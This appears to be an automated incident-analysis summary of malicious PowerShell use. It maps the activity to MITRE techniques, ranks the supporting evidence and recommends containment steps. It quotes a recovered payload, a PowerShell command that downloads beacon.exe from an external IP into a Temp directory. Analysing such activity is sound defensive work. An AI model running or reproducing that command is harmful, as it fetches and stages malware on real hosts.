summary.analyst:
Event: powershell was invoked with an obfuscated command consistent with confirmed malicious activity. Recovered payload reads: `powershell -c "Invoke-WebRequest -Uri http://185.220.101.5/beacon.exe -OutFile C:\Windows\Temp\beacon.exe"`, which corroborates that powershell was used as a launcher for downstream code rather than a routine administrative task.

Living-off-the-land use of powershell bypasses application-allowlisting because the binary itself is signed and trusted; the malicious intent lives in the arguments, not the executable. Investigation mapped the observed behaviour to T1105 · Ingress Tool Transfer, T1059.001 · PowerShell, T1074.001 · Local staging in Public/ProgramData/Temp directory.

Supporting evidence, in weight order: IP · 185.220.101.5 [N-005]; Ingress Tool Transfer [N-006]; Correlated evidence chain · 3 stages [SYNTH-CHAIN-3]; LOLBIN · powershell [N-009]; PowerShell [N-007]. Recovered network/host indicators cover 1 external domain(s), 1 external IP(s).

Impact is confirmed malicious. Any endpoint that executed this payload should be considered compromised until proven otherwise. Scope of observed entities: 1 external domain(s), 1 external IP(s).

No containment signal was observed in the submitted evidence (no quarantine, block, or prevent action was reported). This does not mean containment did not occur — it means the artefact submitted to NivXRay did not include that telemetry.

Recommended next actions: 1. Isolate affected hosts and block the identified indicators at the perimeter; 2. Preserve host artefacts and start forensic triage for the affected users.
